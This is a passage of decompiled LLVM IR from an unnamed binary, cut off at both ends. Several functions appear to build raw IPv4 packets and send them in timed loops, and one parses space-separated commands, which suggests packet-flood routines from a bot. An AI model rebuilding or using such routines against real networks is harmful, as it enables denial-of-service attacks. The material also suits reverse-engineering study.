  %v7_a0ac = call i32 @function_f878(i32 %v3_9d78, i32* nonnull %stack_var_-1572, i32 1500, i32 0, i32 %v2_a07c, i32 16)
  store i32 %stack_var_-52.0, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i32 %stack_var_-52.0, 50
  br i1 %tmp, label %dec_label_pc_a0f0, label %dec_label_pc_a0bc

dec_label_pc_a0bc:                                ; preds = %dec_label_pc_9fcc
  %v2_a0c0 = call i32 @function_cb74(i32* null)
  store i32 %v2_a0c0, i32* %r1.global-to-local, align 4
  store i32 %v2_9d4c, i32* %r2.global-to-local, align 4
  store i32 %v2_a0d4, i32* %r3.global-to-local, align 4
  %v3_a0d8 = icmp ult i32 %v2_a0c0, %v2_a0d4
  br i1 %v3_a0d8, label %dec_label_pc_a0e8, label %dec_label_pc_a0e0

dec_label_pc_a0e0:                                ; preds = %dec_label_pc_a0bc
  %v1_a0e4 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_a0e8

dec_label_pc_a0e8:                                ; preds = %dec_label_pc_a0bc, %dec_label_pc_a0e0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a0f0

dec_label_pc_a0f0:                                ; preds = %dec_label_pc_9fcc, %dec_label_pc_a0e8
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_9fcc ], [ 0, %dec_label_pc_a0e8 ]
  %v1_a0f4 = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_9f54

dec_label_pc_a100:                                ; preds = %dec_label_pc_9d1c
  ret i32 %v1_9d5c

; uselistorder directives
  uselistorder i32 %v1_a048, { 1, 0 }
  uselistorder i32 %v0_a00c, { 1, 0 }
  uselistorder i32 %v3_9ff4, { 1, 0 }
  uselistorder i32 %v1_9fe8, { 1, 0 }
  uselistorder i32 %v3_9fc4, { 1, 0 }
  uselistorder i32 %v0_9fac, { 1, 0 }
  uselistorder i32 %v3_9fa0, { 1, 0 }
  uselistorder i32 %v1_9f94, { 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 2 }
  uselistorder i32 %v3_9f88, { 1, 0 }
  uselistorder i8* %v4_9fc0, { 1, 0 }
  uselistorder i32 %v4_9f2c, { 3, 4, 1, 6, 0, 2, 5, 8, 7 }
  uselistorder i32 %v1_9f28, { 1, 0 }
  uselistorder i32 %v3_9f1c, { 1, 0 }
  uselistorder i8* %tmp42, { 1, 2, 0 }
  uselistorder i32 %v2_9e1c, { 15, 1, 16, 3, 5, 17, 0, 2, 4, 6, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32 %v2_9dec, { 1, 0, 2 }
  uselistorder i32 %v2_9d4c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 6, 7, 8, 11, 12, 17, 18, 13, 14, 15, 16, 19, 21, 22, 20, 23, 30, 24, 26, 27, 25, 28, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a0f0, { 1, 0 }
  uselistorder label %dec_label_pc_a0e8, { 1, 0 }
  uselistorder label %dec_label_pc_9fcc, { 1, 0 }
  uselistorder label %dec_label_pc_9dbc, { 1, 0 }
  uselistorder label %dec_label_pc_9d98, { 1, 0 }
}

define i32 @function_a110(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a110:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-116 = alloca i8, align 1
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a114 = load i32, i32* @fp, align 4
  store i32 %v3_a114, i32* %stack_var_-16, align 4
  store i32 41244, i32* %stack_var_-4, align 4
  %v13_a114 = ptrtoint i32* %stack_var_-16 to i32
  %v2_a118 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a118, i32* @fp, align 4
  %v2_a134 = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_a134, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15088.126 to i32), i32* @r1, align 4
  store i32 80, i32* @r2, align 4
  %v0_a148 = call i32 @function_ec10()
  %v2_a160 = call i32 @function_cb74(i32* null)
  %v1_a170 = call i32 @function_83d8(i32 %arg2)
  %v2_a178 = icmp eq i32 %v1_a170, 0
  br i1 %v2_a178, label %dec_label_pc_a180, label %dec_label_pc_a6a4

dec_label_pc_a180:                                ; preds = %dec_label_pc_a110
  %v8_a188 = icmp sgt i32 %arg3, 2
  br i1 %v8_a188, label %dec_label_pc_a1a4, label %dec_label_pc_a18c

dec_label_pc_a18c:                                ; preds = %dec_label_pc_a180
  store i32 %arg2, i32* @r2, align 4
  %v3_a198 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_150d8.128 to i32))
  %v1_a1a0 = call i32 @function_10500(i32 1)
  br label %dec_label_pc_a1a4

dec_label_pc_a1a4:                                ; preds = %dec_label_pc_a180, %dec_label_pc_a18c
  %v3_a1b0 = call i32 @function_f8dc(i32 2, i32 3, i32 255)
  %v1_a1c0 = icmp slt i32 %v3_a1b0, 0
  br i1 %v1_a1c0, label %dec_label_pc_a1c8, label %dec_label_pc_a224.preheader

dec_label_pc_a1c8:                                ; preds = %dec_label_pc_a1a4
  %v1_a1cc = call i32 @function_10500(i32 1)
  br label %dec_label_pc_a224.preheader

dec_label_pc_a224.preheader:                      ; preds = %dec_label_pc_a1a4, %dec_label_pc_a1c8
  %v2_a1f0 = add i32 %v13_a114, -248
  %v2_a208 = add i32 %v13_a114, -60
  br label %dec_label_pc_a1dc

dec_label_pc_a1dc:                                ; preds = %dec_label_pc_a224.preheader, %dec_label_pc_a1dc
  %storemerge1516 = phi i32 [ 0, %dec_label_pc_a224.preheader ], [ %v1_a21c, %dec_label_pc_a1dc ]
  %v3_a1e8 = mul nuw nsw i32 %storemerge1516, 4
  %v2_a1f4 = add i32 %v2_a1f0, %v3_a1e8
  %v1_a1f8 = inttoptr i32 %v2_a1f4 to i32*
  %v2_a1f8 = load i32, i32* %v1_a1f8, align 4
  %v2_a20c = add i32 %v2_a208, %storemerge1516
  %v1_a214 = trunc i32 %v2_a1f8 to i8
  %v3_a214 = inttoptr i32 %v2_a20c to i8*
  store i8 %v1_a214, i8* %v3_a214, align 1
  %v1_a21c = add nuw nsw i32 %storemerge1516, 1
  %v7_a22c = icmp slt i32 %v1_a21c, 20
  br i1 %v7_a22c, label %dec_label_pc_a1dc, label %dec_label_pc_a230

dec_label_pc_a230:                                ; preds = %dec_label_pc_a1dc
  %v1_a234 = add i32 %arg4, 4
  %v1_a238 = inttoptr i32 %v1_a234 to i32*
  %v2_a238 = load i32, i32* %v1_a238, align 4
  %v2_a244 = call i32 @function_9c5c(i32 %arg2, i32 %v2_a238)
  %v1_a254 = add i32 %arg4, 12
  %v1_a258 = inttoptr i32 %v1_a254 to i32*
  %v2_a258 = load i32, i32* %v1_a258, align 4
  %v1_a260 = inttoptr i32 %v2_a258 to i8*
  %v2_a260 = call i32 @function_10354(i8* %v1_a260)
  store i32 %arg2, i32* @r2, align 4
  %v3_a284 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_15100.130 to i32))
  store i8 69, i8* %stack_var_-116, align 1
  %v1_a3b4 = add i32 %arg4, 8
  %v1_a3b8 = inttoptr i32 %v1_a3b4 to i32*
  %v2_a3b8 = load i32, i32* %v1_a3b8, align 4
  %v1_a3c0 = inttoptr i32 %v2_a3b8 to i8*
  %v2_a3c0 = call i32 @function_10354(i8* %v1_a3c0)
  %v3_a3cc = urem i32 %v2_a3c0, 65536
  %v1_a3d4 = call i32 @function_f294(i32 %v3_a3cc)
  %v2_a5c0 = ptrtoint i32* %stack_var_-96 to i32
  %v2_a5c8 = ptrtoint i32* %stack_var_-156 to i32
  %v2_a5e0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_a5e8 = ptrtoint i32* %stack_var_-136 to i32
  %v2_a610 = bitcast i32* %stack_var_-168 to i8*
  %v2_a62c = ptrtoint i32* %stack_var_-184 to i32
  %v6_a650 = bitcast i8* %stack_var_-116 to i32*
  %v2_a678 = add i32 %v2_a260, %v2_a160
  br label %dec_label_pc_a3e0

dec_label_pc_a3e0:                                ; preds = %dec_label_pc_a694, %dec_label_pc_a230
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_a230 ], [ %v1_a698, %dec_label_pc_a694 ]
  %v0_a3e0 = call i32 @function_fe50()
  %v2_a3f4 = load i32, i32* %v1_a3b8, align 4
  %v1_a3fc = inttoptr i32 %v2_a3f4 to i8*
  %v2_a3fc = call i32 @function_10354(i8* %v1_a3fc)
  %v2_a404 = icmp eq i32 %v2_a3fc, 0
  br i1 %v2_a404, label %dec_label_pc_a40c, label %dec_label_pc_a418

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3e0
  %v0_a40c = call i32 @function_fe50()
  br label %dec_label_pc_a418

dec_label_pc_a418:                                ; preds = %dec_label_pc_a3e0, %dec_label_pc_a40c
  %v0_a418 = call i32 @function_8548()
  %v1_a440 = call i32 @function_f294(i32 60)
  %v0_a454 = call i32 @function_fe50()
  %v3_a494 = urem i32 %v0_a3e0, 65536
  store i32 %v3_a494, i32* %stack_var_-96, align 4
  %v0_a4bc = call i32 @function_fe50()
  store i32 2, i32* %stack_var_-184, align 4
  %v3_a510 = call i32 @function_8cc4(i8* nonnull %stack_var_-116, i32 20)
  %v0_a524 = call i32 @function_fe50()
  store i32 %v0_a418, i32* %stack_var_-168, align 4
  %v1_a5a8 = call i32 @function_f294(i32 40)
  store i32 20, i32* @r2, align 4
  %v3_a5d8 = call i32 @function_ec00(i32 %v2_a5c0, i32 %v2_a5c8, i32 20)
  store i32 20, i32* @r2, align 4
  %v3_a5f8 = call i32 @function_ec00(i32 %v2_a5e0, i32 %v2_a5e8, i32 20)
  %v3_a610 = call i32 @function_8cc4(i8* %v2_a610, i32 52)
  store i32 60, i32* @ip, align 4
  %v7_a650 = call i32 @function_f878(i32 %v3_a1b0, i32* %v6_a650, i32 60, i32 0, i32 %v2_a62c, i32 16)
  %tmp = icmp ult i32 %stack_var_-56.0, 50
  br i1 %tmp, label %dec_label_pc_a694, label %dec_label_pc_a660

dec_label_pc_a660:                                ; preds = %dec_label_pc_a418
  %v2_a664 = call i32 @function_cb74(i32* null)
  %v3_a67c = icmp ult i32 %v2_a664, %v2_a678
  br i1 %v3_a67c, label %dec_label_pc_a68c, label %dec_label_pc_a684

dec_label_pc_a684:                                ; preds = %dec_label_pc_a660
  %v1_a688 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_a68c

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a660, %dec_label_pc_a684
  br label %dec_label_pc_a694

dec_label_pc_a694:                                ; preds = %dec_label_pc_a418, %dec_label_pc_a68c
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_a418 ], [ 0, %dec_label_pc_a68c ]
  %v1_a698 = add i32 %stack_var_-56.1, 1
  br label %dec_label_pc_a3e0

dec_label_pc_a6a4:                                ; preds = %dec_label_pc_a110
  ret i32 %v1_a170

; uselistorder directives
  uselistorder i32 %stack_var_-56.0, { 1, 0 }
  uselistorder i32 %storemerge1516, { 2, 0, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %stack_var_-116, { 1, 0, 2 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a694, { 1, 0 }
  uselistorder label %dec_label_pc_a68c, { 1, 0 }
  uselistorder label %dec_label_pc_a418, { 1, 0 }
  uselistorder label %dec_label_pc_a1dc, { 1, 0 }
  uselistorder label %dec_label_pc_a224.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a1a4, { 1, 0 }
}

define i32 @function_a6b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a6b8:
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 42692, i32* %stack_var_-4, align 4
  %v2_a6c0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a6c0, i32* @fp, align 4
  %v2_a6e8 = call i32 @function_cb74(i32* null)
  %v1_a6f8 = call i32 @function_83d8(i32 %arg2)
  %v2_a700 = icmp eq i32 %v1_a6f8, 0
  br i1 %v2_a700, label %dec_label_pc_a708, label %dec_label_pc_ab8c

dec_label_pc_a708:                                ; preds = %dec_label_pc_a6b8
  %v8_a710 = icmp sgt i32 %arg3, 1
  br i1 %v8_a710, label %dec_label_pc_a72c, label %dec_label_pc_a714

dec_label_pc_a714:                                ; preds = %dec_label_pc_a708
  store i32 %arg2, i32* @r2, align 4
  %v3_a720 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_15118.132 to i32))
  %v1_a728 = call i32 @function_10500(i32 1)
  br label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a708, %dec_label_pc_a714
  %v1_a730 = add i32 %arg4, 8
  %v1_a734 = inttoptr i32 %v1_a730 to i32*
  %v2_a734 = load i32, i32* %v1_a734, align 4
  %v1_a73c = inttoptr i32 %v2_a734 to i8*
  %v2_a73c = call i32 @function_10354(i8* %v1_a73c)
  %v3_a754 = call i32 @function_f8dc(i32 2, i32 3, i32 255)
  %v1_a764 = icmp slt i32 %v3_a754, 0
  br i1 %v1_a764, label %dec_label_pc_a76c, label %dec_label_pc_a774

dec_label_pc_a76c:                                ; preds = %dec_label_pc_a72c
  %v1_a770 = call i32 @function_10500(i32 1)
  br label %dec_label_pc_a774

dec_label_pc_a774:                                ; preds = %dec_label_pc_a72c, %dec_label_pc_a76c
  %v2_a778 = call i32 @function_cb74(i32* null)
  store i32 %v2_a778, i32* @r4, align 4
  %v0_a780 = call i32 @function_ca70()
  %v0_a788 = load i32, i32* @r4, align 4
  %v2_a788 = xor i32 %v0_a788, %v0_a780
  %v1_a790 = call i32 @function_fff4(i32 %v2_a788)
  %v0_a794 = call i32 @function_fe50()
  %v2_a7a0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 1400, i32* @r2, align 4
  %v2_a7b0 = bitcast i32* %stack_var_-72 to i8*
  %v3_a7b0 = call i32 @function_ec20(i8* %v2_a7b0, i32 %v0_a794)
  %v1_a7b8 = add i32 %arg4, 4
  %v1_a7bc = inttoptr i32 %v1_a7b8 to i32*
  %v2_a7bc = load i32, i32* %v1_a7bc, align 4
  %v2_a7c8 = call i32 @function_9c5c(i32 %arg2, i32 %v2_a7bc)
  store i32 %arg2, i32* @r2, align 4
  %v3_a7ec = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1513c.134 to i32))
  %v2_aaa0 = ptrtoint i32* %stack_var_-92 to i32
  %v2_aaa8 = ptrtoint i32* %stack_var_-152 to i32
  %v2_aac8 = ptrtoint i32* %stack_var_-132 to i32
  %v2_aaf0 = bitcast i32* %stack_var_-164 to i8*
  %v2_ab0c = ptrtoint i32* %stack_var_-180 to i32
  %v6_ab30 = bitcast i8* %stack_var_-112 to i32*
  %v2_ab58 = add i32 %v2_a73c, %v2_a6e8
  br label %dec_label_pc_a7f0

dec_label_pc_a7f0:                                ; preds = %dec_label_pc_ab6c, %dec_label_pc_a774
  %stack_var_-44.0 = phi i32 [ %tmp21, %dec_label_pc_a774 ], [ %v1_ab70, %dec_label_pc_ab6c ]
  %v0_a7f0 = call i32 @function_8548()
  store i8 69, i8* %stack_var_-112, align 1
  %v1_a860 = call i32 @function_f294(i32 1440)
  %v0_a874 = call i32 @function_fe50()
  %v0_a8cc = call i32 @function_fe50()
  %v3_a8d8 = urem i32 %v0_a8cc, 65536
  store i32 %v3_a8d8, i32* %stack_var_-92, align 4
  %v0_a8e8 = call i32 @function_fe50()
  %v0_a904 = call i32 @function_fe50()
  %v0_a910 = call i32 @function_fe50()
  store i32 2, i32* %stack_var_-180, align 4
  %v3_aa20 = call i32 @function_8cc4(i8* nonnull %stack_var_-112, i32 20)
  %v3_aa40 = call i32 @function_8cc4(i8* nonnull %stack_var_-112, i32 40)
  store i32 %v0_a7f0, i32* %stack_var_-164, align 4
  %v1_aa88 = call i32 @function_f294(i32 1420)
  store i32 20, i32* @r2, align 4
  %v3_aab8 = call i32 @function_ec00(i32 %v2_aaa0, i32 %v2_aaa8, i32 20)
  store i32 1400, i32* @r2, align 4
  %v3_aad8 = call i32 @function_ec00(i32 %v2_a7a0, i32 %v2_aac8, i32 1400)
  %v3_aaf0 = call i32 @function_8cc4(i8* %v2_aaf0, i32 1432)
  store i32 1440, i32* @ip, align 4
  %v7_ab30 = call i32 @function_f878(i32 %v3_a754, i32* %v6_ab30, i32 1440, i32 0, i32 %v2_ab0c, i32 16)
  %tmp = icmp ult i32 %stack_var_-44.0, 50
  br i1 %tmp, label %dec_label_pc_ab6c, label %dec_label_pc_ab40

dec_label_pc_ab40:                                ; preds = %dec_label_pc_a7f0
  %v2_ab44 = call i32 @function_cb74(i32* null)
  %v3_ab5c = icmp ult i32 %v2_ab44, %v2_ab58
  br i1 %v3_ab5c, label %dec_label_pc_ab64, label %dec_label_pc_ab7c

dec_label_pc_ab64:                                ; preds = %dec_label_pc_ab40
  br label %dec_label_pc_ab6c

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_a7f0, %dec_label_pc_ab64
  %stack_var_-44.1 = phi i32 [ %stack_var_-44.0, %dec_label_pc_a7f0 ], [ 0, %dec_label_pc_ab64 ]
  %v1_ab70 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_a7f0

dec_label_pc_ab7c:                                ; preds = %dec_label_pc_ab40
  %v1_ab80 = call i32 @function_ca18(i32 %v3_a754)
  %v1_ab88 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_ab8c

dec_label_pc_ab8c:                                ; preds = %dec_label_pc_a6b8, %dec_label_pc_ab7c
  %v12_ab90 = phi i32 [ %v1_a6f8, %dec_label_pc_a6b8 ], [ %v1_ab88, %dec_label_pc_ab7c ]
  ret i32 %v12_ab90

; uselistorder directives
  uselistorder i32 %stack_var_-44.0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %stack_var_-112, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0 }
  uselistorder i32 ()* @function_8548, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_9c5c, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_83d8, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ab8c, { 1, 0 }
  uselistorder label %dec_label_pc_ab6c, { 1, 0 }
  uselistorder label %dec_label_pc_a774, { 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
}

define i32 @function_b84c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b84c:
  %stack_var_-4 = alloca i32, align 4
  store i32 47192, i32* %stack_var_-4, align 4
  %v2_b854 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b854, i32* @fp, align 4
  %v2_b86c = load i32, i32* @global_var_21c6c.187, align 4
  store i32 %v2_b86c, i32* @r2, align 4
  %v3_b87c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_15908.208 to i32))
  %v2_b884 = load i32, i32* @global_var_21d80.185, align 4
  store i32 %v2_b884, i32* @r2, align 4
  %v3_b898 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_15918.213 to i32))
  %v2_b8a0 = load i32, i32* @global_var_21c6c.187, align 4
  store i32 %v2_b8a0, i32* @r2, align 4
  %v3_b8b0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_15928.215 to i32))
  ret i32 %v3_b8b0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @function_b8d4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b8d4:
  %stack_var_-4 = alloca i32, align 4
  store i32 47328, i32* %stack_var_-4, align 4
  %v2_b8dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b8dc, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v3_b8fc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_15930.217 to i32))
  ret i32 %v3_b8fc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_b90c(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_b90c:
  %stack_var_-40 = alloca i8, align 1
  %stack_var_-52 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 47384, i32* %stack_var_-4, align 4
  %v2_b914 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b914, i32* @fp, align 4
  store i8* %arg3, i8** %stack_var_-52, align 4
  br label %dec_label_pc_b95c.preheader

dec_label_pc_b944:                                ; preds = %dec_label_pc_b974
  %v1_b948 = add i32 %.pre, 1
  %v5_b94c = inttoptr i32 %v1_b948 to i8*
  %v1_b954 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_b95c

dec_label_pc_b95c:                                ; preds = %dec_label_pc_b95c.preheader, %dec_label_pc_b944
  %stack_var_-36.0 = phi i32 [ %v1_b954, %dec_label_pc_b944 ], [ %stack_var_-36.119, %dec_label_pc_b95c.preheader ]
  %stack_var_-28.0 = phi i8* [ %v5_b94c, %dec_label_pc_b944 ], [ %stack_var_-28.120, %dec_label_pc_b95c.preheader ]
  %v3_b960 = load i8*, i8** %stack_var_-52, align 4
  %v4_b960 = ptrtoint i8* %v3_b960 to i32
  store i32 %v4_b960, i32* @r0, align 4
  %v0_b964 = call i32 @function_ecc0()
  %v3_b96c = icmp ult i32 %stack_var_-36.0, %v0_b964
  %.pre = ptrtoint i8* %stack_var_-28.0 to i32
  br i1 %v3_b96c, label %dec_label_pc_b974, label %dec_label_pc_b984

dec_label_pc_b974:                                ; preds = %dec_label_pc_b95c
  %v2_b978 = load i8, i8* %stack_var_-28.0, align 1
  %v7_b97c = icmp eq i8 %v2_b978, 32
  br i1 %v7_b97c, label %dec_label_pc_b984, label %dec_label_pc_b944

dec_label_pc_b984:                                ; preds = %dec_label_pc_b95c, %dec_label_pc_b974
  %v1_b988 = add i32 %.pre, 1
  %v3_b994 = load i8*, i8** %stack_var_-52, align 4
  %v4_b994 = ptrtoint i8* %v3_b994 to i32
  store i32 %v4_b994, i32* @r0, align 4
  %v0_b998 = call i32 @function_ecc0()
  %v9_b9a0 = icmp eq i32 %stack_var_-36.0, %v0_b998
  br i1 %v9_b9a0, label %dec_label_pc_bc24, label %dec_label_pc_b9a8

dec_label_pc_b9a8:                                ; preds = %dec_label_pc_b984
  %v5_b98c = inttoptr i32 %v1_b988 to i8*
  %v1_b9ac = add nuw nsw i32 %storemerge921, 1
  %v7_b9bc = icmp slt i32 %v1_b9ac, 5
  br i1 %v7_b9bc, label %dec_label_pc_b95c.preheader, label %dec_label_pc_b9d8

dec_label_pc_b95c.preheader:                      ; preds = %dec_label_pc_b90c, %dec_label_pc_b9a8
  %storemerge921 = phi i32 [ 0, %dec_label_pc_b90c ], [ %v1_b9ac, %dec_label_pc_b9a8 ]
  %stack_var_-28.120 = phi i8* [ %arg3, %dec_label_pc_b90c ], [ %v5_b98c, %dec_label_pc_b9a8 ]
  %stack_var_-36.119 = phi i32 [ 0, %dec_label_pc_b90c ], [ %stack_var_-36.0, %dec_label_pc_b9a8 ]
  br label %dec_label_pc_b95c

dec_label_pc_b9cc:                                ; preds = %dec_label_pc_b9f0
  %v1_b9d0 = add i32 %storemerge10, 1
  br label %dec_label_pc_b9d8

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9a8, %dec_label_pc_b9cc
  %storemerge10 = phi i32 [ %v1_b9d0, %dec_label_pc_b9cc ], [ 0, %dec_label_pc_b9a8 ]
  store i32 %storemerge10, i32* @r4, align 4
  store i32 %v1_b988, i32* @r0, align 4
  %v0_b9e0 = call i32 @function_ecc0()
  %v0_b9e8 = load i32, i32* @r4, align 4
  %v3_b9e8 = icmp ult i32 %v0_b9e8, %v0_b9e0
  br i1 %v3_b9e8, label %dec_label_pc_b9f0, label %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge

dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge:    ; preds = %dec_label_pc_b9d8
  %.pre27 = add i32 %storemerge10, %v1_b988
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_ba0c

dec_label_pc_b9f0:                                ; preds = %dec_label_pc_b9d8
  %v2_b9fc = add i32 %storemerge10, %v1_b988
  %v1_ba00 = inttoptr i32 %v2_b9fc to i8*
  %v2_ba00 = load i8, i8* %v1_ba00, align 1
  %v7_ba04 = icmp eq i8 %v2_ba00, 32
  br i1 %v7_ba04, label %dec_label_pc_ba0c, label %dec_label_pc_b9cc

dec_label_pc_ba0c:                                ; preds = %dec_label_pc_b9f0, %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge
  %v3_ba20.pre-phi = phi i8* [ %.pre28, %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge ], [ %v1_ba00, %dec_label_pc_b9f0 ]
  store i8 0, i8* %v3_ba20.pre-phi, align 1
  %v2_ba28 = load i32, i32* @global_var_21c6c.187, align 4
  %v4_ba34 = call i32 @function_f0f4(i8* %v5_b98c, i32 %v2_ba28)
  %v2_ba3c = icmp eq i32 %v4_ba34, 0
  br i1 %v2_ba3c, label %dec_label_pc_ba44, label %dec_label_pc_bc24

dec_label_pc_ba44:                                ; preds = %dec_label_pc_ba0c
  %v2_ba48 = load i32, i32* @global_var_1f4f4.35, align 4
  %v2_ba4c = icmp eq i32 %v2_ba48, 0
  br i1 %v2_ba4c, label %dec_label_pc_ba54, label %dec_label_pc_bc24

dec_label_pc_ba54:                                ; preds = %dec_label_pc_ba44
  %v3_ba54 = load i8*, i8** %stack_var_-52, align 4
  br label %dec_label_pc_ba88.preheader

dec_label_pc_ba70:                                ; preds = %dec_label_pc_baa0
  %v1_ba74 = add i32 %.pre29, 1
  %v5_ba78 = inttoptr i32 %v1_ba74 to i8*
  %v1_ba80 = add i32 %stack_var_-36.2, 1
  br label %dec_label_pc_ba88

dec_label_pc_ba88:                                ; preds = %dec_label_pc_ba88.preheader, %dec_label_pc_ba70
  %stack_var_-36.2 = phi i32 [ %v1_ba80, %dec_label_pc_ba70 ], [ %stack_var_-36.316, %dec_label_pc_ba88.preheader ]
  %stack_var_-28.2 = phi i8* [ %v5_ba78, %dec_label_pc_ba70 ], [ %stack_var_-28.317, %dec_label_pc_ba88.preheader ]
  %v3_ba8c = load i8*, i8** %stack_var_-52, align 4
  %v4_ba8c = ptrtoint i8* %v3_ba8c to i32
  store i32 %v4_ba8c, i32* @r0, align 4
  %v0_ba90 = call i32 @function_ecc0()
  %v3_ba98 = icmp ult i32 %stack_var_-36.2, %v0_ba90
  %.pre29 = ptrtoint i8* %stack_var_-28.2 to i32
  br i1 %v3_ba98, label %dec_label_pc_baa0, label %dec_label_pc_bab0

dec_label_pc_baa0:                                ; preds = %dec_label_pc_ba88
  %v2_baa4 = load i8, i8* %stack_var_-28.2, align 1
  %v7_baa8 = icmp eq i8 %v2_baa4, 32
  br i1 %v7_baa8, label %dec_label_pc_bab0, label %dec_label_pc_ba70

dec_label_pc_bab0:                                ; preds = %dec_label_pc_ba88, %dec_label_pc_baa0
  %v1_bab4 = add i32 %.pre29, 1
  %v3_bac0 = load i8*, i8** %stack_var_-52, align 4
  %v4_bac0 = ptrtoint i8* %v3_bac0 to i32
  store i32 %v4_bac0, i32* @r0, align 4
  %v0_bac4 = call i32 @function_ecc0()
  %v9_bacc = icmp eq i32 %stack_var_-36.2, %v0_bac4
  br i1 %v9_bacc, label %dec_label_pc_bc24, label %dec_label_pc_bad4

dec_label_pc_bad4:                                ; preds = %dec_label_pc_bab0
  %v5_bab8 = inttoptr i32 %v1_bab4 to i8*
  %v1_bad8 = add nuw nsw i32 %storemerge1118, 1
  %v7_bae8 = icmp slt i32 %v1_bad8, 3
